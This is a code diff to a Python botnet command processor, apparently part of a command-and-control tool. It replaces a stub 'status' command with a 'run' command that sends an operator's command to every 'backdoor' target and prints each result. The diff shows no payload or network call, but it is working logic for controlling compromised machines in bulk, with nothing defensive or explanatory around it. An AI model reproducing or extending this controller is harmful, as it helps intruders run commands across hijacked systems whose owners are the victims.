@@ -50,11 +50,13 @@ class BotnetCommandProcessor(CommandProcessor):
             "description": "Export a timestamped file with all the targets.",
             "usage": "export\n"
         }
-        self.commands["status"] = {
-            "method": self.__status,
-            "description": "Get the status of all the target(s).",
-            "usage": ("export [name]...\n"
-                      "    name: a space seperated list of target names")
+        self.commands["run"] = {
+            "method": self.__run,
+            "description": ("Run a command on all of the backdoors. As if you"
+                                " ran the 'ran' command on each backdoor "
+                                "individually"),
+            "usage": ("run command"
+                      "    command: the command to be ran.")
         }
         
     """
@@ -189,18 +191,23 @@ class BotnetCommandProcessor(CommandProcessor):
             json.dump(out, f, ensure_ascii=False, indent=4)
 
     """
-    @brief Get the status of the target(s)
-    @param options a comma seperated list of the targets, or nothing.
+    @brief Run a command on each of the backdoors.
+    @param options the comand to be ran.
     """
-    def __status(self, options: str):
-        names = []
-        if len(options) == 0:
-            names = map(lambda host : host["name"], self.targets)
-        else:
-            names = options.split(" ")
+    def __run(self, options: str):
+        if len(self.targets) == 0:
+            raise CommandException("No targets added.")
+        
+        try:
+            print(f"{self.targets[0]['name']}: ")
+            self.targets[0]["processor"].process_command(options)
+        except CommandException as e:
+            print(str(e))
 
-        for name in names:
-            pass
+        for target in self.targets[1:]:
+            print("-" * 80)
+            print(f"{target['name']}: ")
+            target["processor"].process_command(options)
             
     """
     @brief See base class for details.
